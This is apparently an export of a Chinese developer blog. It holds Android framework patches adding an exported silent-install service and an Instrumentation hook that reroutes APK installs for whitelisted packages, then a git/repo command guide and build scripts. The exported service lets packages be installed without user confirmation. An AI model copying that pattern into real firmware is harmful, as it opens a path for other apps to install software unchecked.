&#123;</span><br><span class="line">+        onPackageInstalled(PackageInstaller.STATUS_FAILURE);</span><br><span class="line">+            Log.d(&quot;jinny SilenceInstallService Exception6&quot;,e.toString());</span><br><span class="line">+        &#125; finally &#123;</span><br><span class="line">+            if(session!=null)</span><br><span class="line">+                session.close();</span><br><span class="line">+            clearCachedApkIfNeededAndFinish();</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private void clearCachedApkIfNeededAndFinish() &#123;</span><br><span class="line">+        if (&quot;file&quot;.equals(mPackageURI.getScheme()) &amp;&amp; mPackageURI.getPath() != null</span><br><span class="line">+                &amp;&amp; mPackageURI.getPath().startsWith(getNoBackupFilesDir().toString())) &#123;</span><br><span class="line">+            File file = new File(mPackageURI.getPath());</span><br><span class="line">+            boolean delete = file.delete();</span><br><span class="line">+            Log.d(JINNYTAG, &quot;clearCachedApkIfNeededAndFinish delete = &quot;+delete);</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/AndroidManifest.xml b/AndroidManifest.xml</span><br><span class="line">index 654e5d1c..ab656fab 100644</span><br><span class="line">--- a/AndroidManifest.xml</span><br><span class="line">+++ b/AndroidManifest.xml</span><br><span class="line">@@ -131,6 +131,11 @@</span><br><span class="line">             &lt;/intent-filter&gt;</span><br><span class="line">         &lt;/service&gt;</span><br><span class="line"> </span><br><span class="line">+        &lt;service</span><br><span class="line">+            android:name=&quot;.SilenceInstallService&quot;</span><br><span class="line">+            android:exported=&quot;true&quot; &gt;</span><br><span class="line">+        &lt;/service&gt;</span><br><span class="line">+</span><br><span class="line">         &lt;provider android:name=&quot;.wear.WearPackageIconProvider&quot;</span><br><span class="line">                   android:authorities=&quot;com.google.android.packageinstaller.wear.provider&quot;</span><br><span class="line">                   android:grantUriPermissions=&quot;true&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-动态切换系统安装器和定制化的安装器"><a href="#3-动态切换系统安装器和定制化的安装器" class="headerlink" title="3 动态切换系统安装器和定制化的安装器"></a>3 动态切换系统安装器和定制化的安装器</h2><p>需求：用Hook、Intent、包名白名单的方式，去动态切换系统安装器和定制化的安装器。</p><p>补丁：<a href="mailto:&#x72;&#x6b;&#x37;&#49;&#x2d;&#102;&#x72;&#x61;&#109;&#x65;&#x77;&#111;&#114;&#x6b;&#x73;&#45;&#x62;&#x61;&#x73;&#101;&#x2d;&#x63;&#111;&#114;&#x65;&#64;&#x61;&#x64;&#100;&#x5f;&#x68;&#x6f;&#x6f;&#107;&#x5f;&#105;&#110;&#x74;&#101;&#114;&#x63;&#x65;&#x70;&#116;&#x5f;&#x69;&#110;&#115;&#x74;&#97;&#108;&#108;&#97;&#116;&#105;&#111;&#110;&#x5f;&#105;&#x6e;&#x74;&#101;&#110;&#116;&#46;&#112;&#x61;&#116;&#99;&#104;">&#x72;&#x6b;&#x37;&#49;&#x2d;&#102;&#x72;&#x61;&#109;&#x65;&#x77;&#111;&#114;&#x6b;&#x73;&#45;&#x62;&#x61;&#x73;&#101;&#x2d;&#x63;&#111;&#114;&#x65;&#64;&#x61;&#x64;&#100;&#x5f;&#x68;&#x6f;&#x6f;&#107;&#x5f;&#105;&#110;&#x74;&#101;&#114;&#x63;&#x65;&#x70;&#116;&#x5f;&#x69;&#110;&#115;&#x74;&#97;&#108;&#108;&#97;&#116;&#105;&#111;&#110;&#x5f;&#105;&#x6e;&#x74;&#101;&#110;&#116;&#46;&#112;&#x61;&#116;&#99;&#104;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/app/Instrumentation.java b/core/java/android/app/Instrumentation.java</span><br><span class="line">index 95ea2a561bb..e9a572bba81 100644</span><br><span class="line">--- a/core/java/android/app/Instrumentation.java</span><br><span class="line">+++ b/core/java/android/app/Instrumentation.java</span><br><span class="line">@@ -48,6 +48,8 @@ import android.view.MotionEvent;</span><br><span class="line"> import android.view.ViewConfiguration;</span><br><span class="line"> import android.view.Window;</span><br><span class="line"> import com.android.internal.content.ReferrerIntent;</span><br><span class="line">+import android.content.pm.PackageManager;</span><br><span class="line">+import android.content.pm.PackageInfo;</span><br><span class="line"> </span><br><span class="line"> import java.io.File;</span><br><span class="line"> import java.lang.annotation.Retention;</span><br><span class="line">@@ -82,6 +84,8 @@ public class Instrumentation &#123;</span><br><span class="line"> </span><br><span class="line">     private static final String TAG = &quot;Instrumentation&quot;;</span><br><span class="line"> </span><br><span class="line">+    private static final String[] WHITE_LIST = &#123;&quot;com.example.launcherlearn2&quot;&#125;;</span><br><span class="line">+</span><br><span class="line">     /**</span><br><span class="line">      * @hide</span><br><span class="line">      */</span><br><span class="line">@@ -1492,6 +1496,36 @@ public class Instrumentation &#123;</span><br><span class="line">     public ActivityResult execStartActivity(</span><br><span class="line">             Context who, IBinder contextThread, IBinder token, Activity target,</span><br><span class="line">             Intent intent, int requestCode, Bundle options) &#123;</span><br><span class="line">+</span><br><span class="line">+        Log.d(&quot;hukaichao intent: &quot;,intent.toString());</span><br><span class="line">+        Uri data = intent.getData();</span><br><span class="line">+        if (data != null) &#123;</span><br><span class="line">+            String filePath = data.getPath();</span><br><span class="line">+            if (filePath != null &amp;&amp; filePath.endsWith(&quot;.apk&quot;)) &#123;</span><br><span class="line">+                File file = new File(filePath);</span><br><span class="line">+                if (file.exists()) &#123;</span><br><span class="line">+                    PackageManager pm = who.getPackageManager();</span><br><span class="line">+                    PackageInfo info = pm.getPackageArchiveInfo(filePath, PackageManager.GET_ACTIVITIES);</span><br><span class="line">+                    if (info != null) &#123;</span><br><span class="line">+                        String packageName = info.packageName;</span><br><span class="line">+                        Log.d(&quot;hukaichao pacakage&quot;, packageName);</span><br><span class="line">+                        for (String whitePackageName : WHITE_LIST) &#123;</span><br><span class="line">+                            if (whitePackageName.equals(packageName)) &#123;</span><br><span class="line">+                                intent.setAction(&quot;android.intent.action.SILENCE_INSTALL_PACKAGE&quot;);</span><br><span class="line">+                                intent.setPackage(&quot;com.techvision.scanandinstallapk&quot;);</span><br><span class="line">+                                intent.putExtra(&quot;apk_path&quot;, filePath);</span><br><span class="line">+                                Log.d(&quot;hukaichao Instrumentation&quot;,&quot;action = &quot;+intent.getAction());</span><br><span class="line">+                            &#125;</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &#125;</span><br><span class="line">+                &#125; else &#123;</span><br><span class="line">+                    Log.d(&quot;hukaichao Instrumentation&quot;,&quot;file not exists&quot;);</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                Log.d(&quot;hukaichao Instrumentation&quot;,&quot;filePath is null or not end with .apk&quot;);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">         IApplicationThread whoThread = (IApplicationThread) contextThread;</span><br><span class="line">         Uri referrer = target != null ? target.onProvideReferrer() : null;</span><br><span class="line">         if (referrer != null) &#123;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git&amp;repo常用指令</title>
    <link href="/2023/08/21/git&amp;repo%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/08/21/git&amp;repo%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="git常用指令"><a href="#git常用指令" class="headerlink" title="git常用指令"></a>git常用指令</h2><p><img src="/upload/2023/08/011500266295799.jpg"></p><p>初始化git</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git init                                                  # 初始化本地git仓库（创建新仓库）</span><br><span class="line">git config --global user.name &quot;xxx&quot;                       # 配置用户名</span><br><span class="line">git config --global user.email &quot;xxx@xxx.com&quot;              # 配置邮件</span><br></pre></td></tr></table></figure><p>在从服务器拉去代码时，一般需要SSH公钥来授权，.pub 文件是公钥，另一个文件是密钥。用 ssh-keygen 的程序来建立它们。然后将公钥发送给服务器管理者即可。</p><h3 id="git将本地项目上传到云端"><a href="#git将本地项目上传到云端" class="headerlink" title="git将本地项目上传到云端"></a>git将本地项目上传到云端</h3><p>关联远程仓库：</p><p>git remote add origin &lt;远程仓库的URL&gt;</p><p>推送到远程仓库：</p><p>git push -u origin master</p><p>取消之前添加的名为origin的远程仓库</p><p>git remote remove origin</p><p>这里需要git的用户名和邮箱和远程仓库匹配</p><p>如果与远程仓库有冲突，需要覆盖远程仓库的代码（一般用于新建的远程仓库），可以用以下命令强制推送：</p><p>git push -u origin master –force</p><h3 id="git打补丁"><a href="#git打补丁" class="headerlink" title="git打补丁"></a>git打补丁</h3><p>git diff 为一个新增文件生成一个patch文件指令：</p><p>git diff –no-index &#x2F;dev&#x2F;null path&#x2F;to&#x2F;newfile &gt; newfile.patch</p><p>解释：</p><ul><li>git diff：用于比较当前工作目录与暂存区或已提交的版本之间的差异。</li><li>–no-index：用于告诉Git不要将当前目录看作是一个Git仓库。</li><li>&#x2F;dev&#x2F;null：空白的文件路径，表示一个空的初始版本。</li><li>path&#x2F;to&#x2F;newfile：新增文件的路径。</li><li>&gt;：重定向符号，将输出结果保存到文件中。</li><li>newfile.patch：指定生成的patch文件的名称。</li></ul><p>运行这条命令后，Git将比较一个空的初始版本（&#x2F;dev&#x2F;null）和新增文件的内容，并将差异写入名为newfile.patch的文件中。</p><p>git应用补丁：<code>git apply 1.diff</code></p><h3 id="git-回退操作"><a href="#git-回退操作" class="headerlink" title="git 回退操作"></a>git 回退操作</h3><p>在发现当前版本有bug，需要回退到之前的版本时，执行的指令为：<code>git revert commitId</code><br>git revert 的作用是创建一个新的提交，该提交取消之前某个提交引入的变更，从而将代码库恢复到指定提交的状态。这是通过应用指定提交的逆向补丁来实现的。<br>需要注意的是，git revert 不是修改历史的命令，而是通过创建新的提交来反转变更。因此，它是安全的，不会破坏历史记录。这也意味着你可以在分支上多次使用 git revert，每次撤销一个或多个提交。</p><p>除了git revert，还可以执行<code>git reset --hard commitId</code></p><p>git reset 是 Git 中的一个命令，用于修改当前分支的指针位置，并可能修改工作目录和暂存区。git reset 的常见用法有三种模式：soft、mixed（默认）、和hard。</p><p><code>git reset --soft commitId</code> 这种模式只是将 HEAD 指针移动到指定的提交，不会修改暂存区和工作目录。之后你可以通过修改文件、再次提交等方式，将代码库恢复到新的状态。</p><p><code>git reset commitId</code><br>这是默认的模式。它将 HEAD 指针移动到指定的提交，并且重置暂存区，但不会修改工作目录。这意味着工作目录的文件仍然保留对应提交的内容，但暂存区的文件将会回到指定提交的状态。</p><p><code>git reset --hard commitId</code><br>这种模式是最彻底的，它将 HEAD 指针移动到指定的提交，同时重置暂存区和工作目录，使它们完全匹配指定提交的状态。慎用，因为它会丢弃未提交的更改。</p><p>需要注意的是，git reset 是修改历史的命令，因此在对已共享的分支使用时要谨慎。如果你已经推送了这个分支，最好不要对已推送的提交执行 git reset 操作，以免破坏其他人的工作。在这种情况下，更安全的选择可能是使用 git revert 创建一个新的撤销提交。</p><p>如果你通过 git reset 将指针移动到指定的提交，并发现后续的提交记录不可见，可以执行<code>git reflog</code> 命令，它将显示 HEAD 的历史记录，包括之前的位置和提交。</p><h3 id="git删除操作"><a href="#git删除操作" class="headerlink" title="git删除操作"></a>git删除操作</h3><p>在仓库进行修改后想要不保存修改还原，可以采用 <code>git checkout .</code><br>在仓库中新增了文件并没有进行跟踪(即没有进行git add)，此时想要将未跟踪文件删除可以使用 <code>git clean -df</code><br>注意该操作不可撤销，删除后就无法找回文件了，要查看git clean会删除哪些文件可以先使用 <code>git clean -n</code>查看将要被删除的文件，并不实际删除文件</p><h2 id="repo"><a href="#repo" class="headerlink" title="repo"></a>repo</h2><p>repo是一个用python脚本来统一管理若干个项目的git仓库，使git的使用更简单。安卓开发一般采用repo进行版本管理。</p><p>.repo为版本管理文件夹，其中有安卓的各个版本的镜像。</p><h3 id="Repo的安装"><a href="#Repo的安装" class="headerlink" title="Repo的安装"></a>Repo的安装</h3><p>curl <a href="http://commondatastorage.googleapis.com/git-repo-downloads/repo">http://commondatastorage.googleapis.com/git-repo-downloads/repo</a> &gt; ~&#x2F;bin&#x2F;repo</p><p>chmod a+x ~&#x2F;bin&#x2F;repo</p><p>创建ssh密钥</p><p>sudo apt-get install openssh-client</p><p>ssh-keygen -t rsa -C “<a href="mailto:&#121;&#x6f;&#x75;&#x72;&#95;&#x6e;&#x61;&#x6d;&#x65;&#64;&#116;&#x65;&#99;&#x68;&#x76;&#x69;&#115;&#105;&#x6f;&#110;&#x2e;&#99;&#x6f;&#x6d;&#x2e;&#x63;&#x6e;">&#121;&#x6f;&#x75;&#x72;&#95;&#x6e;&#x61;&#x6d;&#x65;&#64;&#116;&#x65;&#99;&#x68;&#x76;&#x69;&#115;&#105;&#x6f;&#110;&#x2e;&#99;&#x6f;&#x6d;&#x2e;&#x63;&#x6e;</a>“</p><p>把生成的xxx_rsa.pub发给代码管理者</p><p>Repo版本库基本操作介绍</p><h3 id="初始化Repo版本库"><a href="#初始化Repo版本库" class="headerlink" title="初始化Repo版本库"></a>初始化Repo版本库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo init --repo-url git@192.168.100.48:/home/git-server/rk_sdk/kitkat_rk3188/rk/tools/repo.git/ -u git@192.168.100.48:/home/git-server/rk_sdk/kitkat_rk3188/rk/platform/manifest.git/ -b android-4.4 -m base_rk3188_android4.4.1.xml</span><br></pre></td></tr></table></figure><p>从服务器第一次同步版本库，将SDK内容拉到本地</p><p>repo sync -j8</p><p>Checkout出基础分支（一般不需要Checkout出基础分支，以免混淆）<br>.&#x2F;branch_checkout.sh base_android-4.4<br>以本地分支base_android-4.4为基础，创建本地机型分支TVExxxW（一般不要使用此方法）<br>.&#x2F;branch_checkout.sh -b TVExxxW<br>以远程分支TVI3001U为基础，创建本地机型分支TVExxxW（通常使用此方法来建立新分支）<br>.&#x2F;branch_checkout.sh -b TVI3001U -t TVI3001U（后面的为远程）</p><p>将本地分支TVExxxW推送到远程服务器<br>.&#x2F;branch_push.sh TVExxxW</p><p>当服务器有多个仓库更新，可以用下面的语句来进行更新<br>repo forall -c “pwd;git pull mediatek TVE1078M”<br>更稳一点的语句：<br>repo forall -c “pwd;git remote update;git pull mediatek TVE1078M”</p><p>当服务器基础分支base_android-4.4有更新时，同步本地分支（通常使用此方法来同步分支）<br>repo diff （检查是否有未提交的修改）<br>repo sync -j8 -d<br>.&#x2F;branch_sync.sh -r base_android-4.4</p><p>当服务器分支有更新时，需要同步分支，更简洁的方法如下，其中包括同步服务器、Checkout到想同步的分支、同步服务器分支、提交被同步的分支，注意同步前先保证当前版本库均已提交，即使用repo diff检查时没有任何未提交的修改（推荐使用此方法同步分支）</p><p>repo diff （检查是否有未提交的修改）</p><p>repo sync -j8 -d</p><p>.&#x2F;branch_update.sh TVExxxW -r base_android-4.4</p><p>常用操作指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">branch_checkout.sh</span><br><span class="line"></span><br><span class="line">branch_mergetool.sh</span><br><span class="line"></span><br><span class="line">branch_push.sh</span><br><span class="line"></span><br><span class="line">branch_sync.sh</span><br><span class="line"></span><br><span class="line">branch_update.sh</span><br></pre></td></tr></table></figure><p>常用基本编译shell</p><p>revert.sh 恢复各个git的状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">repo forall -c &quot;pwd; git reset; git checkout .&quot;</span><br><span class="line"></span><br><span class="line">menu.sh 内核图形化配置</span><br><span class="line"></span><br><span class="line">cd kernel</span><br><span class="line"></span><br><span class="line">make menuconfig</span><br><span class="line"></span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure><p>clean.sh 内核编译前的清理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># clean kernel</span><br><span class="line"></span><br><span class="line">cd kernel</span><br><span class="line"></span><br><span class="line">make clean -j$(grep processor /proc/cpuinfo | awk &#x27;&#123;field=$NF&#125;;END&#123;print field+1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line"># clean android</span><br><span class="line"></span><br><span class="line">make clean -j$(grep processor /proc/cpuinfo | awk &#x27;&#123;field=$NF&#125;;END&#123;print field+1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># clean not manager file</span><br><span class="line"></span><br><span class="line">#repo forall -c &quot;pwd; git clean -df&quot;</span><br></pre></td></tr></table></figure><p>基本编译指令</p><p>kernel.sh 内核编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd kernel</span><br><span class="line"></span><br><span class="line">make kernel.img -j$(grep processor /proc/cpuinfo | awk &#x27;&#123;field=$NF&#125;;END&#123;print field+1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">rm -f RKTools/windows/AndroidTool_Release_v2.1/rockdev/Image/kernel.img</span><br><span class="line"></span><br><span class="line">mkdir -p RKTools/windows/AndroidTool_Release_v2.1/rockdev/Image</span><br><span class="line"></span><br><span class="line">cp kernel/kernel.img RKTools/windows/AndroidTool_Release_v2.1/rockdev/Image/</span><br></pre></td></tr></table></figure><p>image.sh androd编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rm out/target/product/rk3188/kernel</span><br><span class="line"></span><br><span class="line">rm out/target/product/rk3188/*.img</span><br><span class="line"></span><br><span class="line">rm out/target/product/rk3188/*.zip</span><br><span class="line"></span><br><span class="line">rm -rf out/target/product/rk3188/data/</span><br><span class="line"></span><br><span class="line">rm -rf out/target/product/rk3188/recovery/</span><br><span class="line"></span><br><span class="line">rm -rf out/target/product/rk3188/root/</span><br><span class="line"></span><br><span class="line">rm -rf out/target/product/rk3188/system/</span><br><span class="line"></span><br><span class="line">make -j$(grep processor /proc/cpuinfo | awk &#x27;&#123;field=$NF&#125;;END&#123;print field+1&#125;&#x27;)</span><br></pre></td></tr></table></figure><p>全部编译shell：debug.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./kernel.sh</span><br><span class="line"></span><br><span class="line">./image.sh</span><br><span class="line"></span><br><span class="line">./mkimage.sh</span><br></pre></td></tr></table></figure><p>这个主要是调试是常用的全编译shell</p><p>编译时内核不打入boot中，</p><p>这样内核调试时，只需更新内核即可，不需要重新烧录boot</p><p>基本编译指令：all.sh</p><p>检查分支是否在都同在一个分支上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./revert.sh</span><br><span class="line"></span><br><span class="line">./kernel.sh</span><br><span class="line"></span><br><span class="line">./image.sh</span><br><span class="line"></span><br><span class="line">./mkimage.sh ota</span><br></pre></td></tr></table></figure><p>保存manifest（重要）</p><p>生产固件文件名</p><p>使用技巧</p><p>基础分支：base_android-4.4（Marvell：base_pxa988_jb4.2_T7.beta3-sp6）</p><p>所有分支应与基础分支为基础，分支的建立应有继承性，拒绝随意建立分支；在版本库，初始化后的分支实际是一个“隐性分支”m&#x2F;android-4.4，但此分支并不能进行实际操作；所以所有分支树结构如下：</p><p>m&#x2F;android-4.4 —-&gt; base_android-4.4 —-&gt; TVE733W</p><p>|–&gt; TVE789W</p><p>|–&gt; TVE105W</p><p>|–&gt; …</p><p>若出现同步、上传版本库出错，可尝试删除.repo目录下的manifests相关的目录和文件，再重新执行repo init指令后再同步、上传，重新初始化后，最好先进行一次同步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm -rf .repo/manifest*</span><br><span class="line"></span><br><span class="line">repo init --repo-url git@192.168.100.48:/home/git-server/rk_sdk/kitkat_rk3188/rk/tools/repo.git/ -u git@192.168.100.48:/home/git-server/rk_sdk/kitkat_rk3188/rk/platform/manifest.git/ -b android-4.4 -m base_rk3188_android4.4.1.xml</span><br><span class="line"></span><br><span class="line">./branch_checkout.sh base_android-4.4</span><br><span class="line"></span><br><span class="line">./branch_sync.sh -r base_android-4.4</span><br></pre></td></tr></table></figure><p>在SDK根目录的文件无法接受版本管理，所以，需要将加入的补丁、编译shell等放到有版本管理的目录，补丁文件保存在RKTools&#x2F;patch&#x2F;目录下，编译shell文件保存在RKTools&#x2F;shell&#x2F;目录下（Marvell保存在build&#x2F;patch&#x2F;、build&#x2F;shell&#x2F;目录）</p><p>RKTools目录的更新：repo sync RKTools 或 repo sync RKTools -d</p><p>Marvell：build目录的更新：repo sync build 或 repo sync build -d</p><p>MTK SDK 这些文件保存在Tools目录下。</p><p>为了进一步规范RKTools&#x2F;Tools,目录请参考《RK平台RKTools目录规范说明.doc》</p><p>当服务器有更新时，一般情况下使用封装指令同步：</p><p>.&#x2F;branch_sync.sh -r base_android-4.4</p><p>但也有特殊情况，若服务器某些git仓库的基础分支的指向有变化、增加了新的git仓库、或在使用封装指令同步出错时，则需要使用repo指令同步一次再使用封装同步：</p><p>repo sync -j8 或 repo sync -j8 -d （提示does not track upstream时使用）</p><p>.&#x2F;branch_checkout.sh TVExxxX</p><p>.&#x2F;branch_sync.sh -r base_android-4.4</p><p>.&#x2F;branch_mergetool.sh（有些冲突在merge时会自动合并，但通常也是不正确的，且使用mergetool也无法检测出来，故需要手动在查找sync过程中是否有“Conflict”字串出现，若有则必须进行以下步骤解决冲突并提交）</p><p>cd conflict_porject&#x2F;（遇到有冲突的project，解决冲突后需在本地预告提交）</p><p>git commit</p><p>cd sdk_root&#x2F;</p><p>.&#x2F;branch_push.sh TVExxxX</p><p>若git仓库指向发生变化，需要进到相应的git仓库删除旧的远程仓库：</p><p>cd modify_git_folder</p><p>git remote rm aosp</p><p>若增加了新的git仓库，需要进到相应的git仓库，为自己的分支建立相应的分支：</p><p>cd new_git_folder</p><p>git checkout -b TVExxxX -t rk&#x2F;base_android-4.4</p><p>git push rk TVExxxX</p><p>同步后在使用repo branch查看分支情况时，出现本地分支提示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* TVExxxX | not in external/rk-pcba-test</span><br></pre></td></tr></table></figure><p>则表示此本地分支在external&#x2F;rk-pcba-test的git仓库中没有分支，则需要进入此git仓库单独创建此分支，再查看分支情况时应提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* TVExxxX | in all projects</span><br></pre></td></tr></table></figure><p>查看当前修改可以直接使用repo diff</p><p>查看当前分支与基础分支差异时，可以先导出差异文件后，再进到相应git仓库查看或导出差异：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">repo forall -c &quot;pwd; git diff --name-status base_android-4.4&quot;</span><br><span class="line"></span><br><span class="line">cd diff_git_folder</span><br><span class="line"></span><br><span class="line">git diff --binary base_android-4.4 &gt; patch_folder/diff.patch</span><br></pre></td></tr></table></figure><p>对repo版本库下的所有git仓库进行相同的git操作时，可使用repo forall -c指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo forall -c &quot;pwd; git command&quot;</span><br></pre></td></tr></table></figure><h2 id="安卓开发"><a href="#安卓开发" class="headerlink" title="安卓开发"></a>安卓开发</h2><p><img src="/upload/2023/08/image.png"></p><p>上层applications为Java实现，Java调用下层提供的接口即可。</p><p>application framework为框架，负责联通C++的底层和Java的上层。</p><p>安卓底层为linux。</p><p><img src="/upload/2023/08/image-tofd.png"></p><p>安卓启动流程：</p><p>uboot -&gt; loader -&gt; linux -&gt; init -&gt; zygote -&gt; java app</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安卓基础 源码编译</title>
    <link href="/2023/08/21/%E5%AE%89%E5%8D%93%E5%9F%BA%E7%A1%80%20%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    <url>/2023/08/21/%E5%AE%89%E5%8D%93%E5%9F%BA%E7%A1%80%20%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<p>关键词：Android；源码编译； 入门培训</p><h2 id="1、Android-基础"><a href="#1、Android-基础" class="headerlink" title="1、Android 基础"></a>1、Android 基础</h2><h3 id="1-1、APP-目录结构"><a href="#1-1、APP-目录结构" class="headerlink" title="1.1、APP 目录结构"></a>1.1、APP 目录结构</h3><p><img src="/upload/2023/08/image-tkgd.png"><br>说明：</p><ul><li>manifests：整个安卓项目的配置文件，在程序中定义的所有四大组件都需要在这个文件里注册，以及在此给应用程序添加权限声明</li><li>java：放置 java 代码的地方</li><li>cpp：放置 jni 代码的地方</li><li>res：放置资源文件、布局文件</li><li>gradle：这个目录下包含gradle wrapper的配置文件，使用gradle wrapper的方式不需要提前将gradle下载好，而是会自动根据本地的缓存情况决定是否需要联网下载gradle。</li><li>build.gradle：gradle构建脚本。</li></ul><h3 id="1-2、如何查看日志"><a href="#1-2、如何查看日志" class="headerlink" 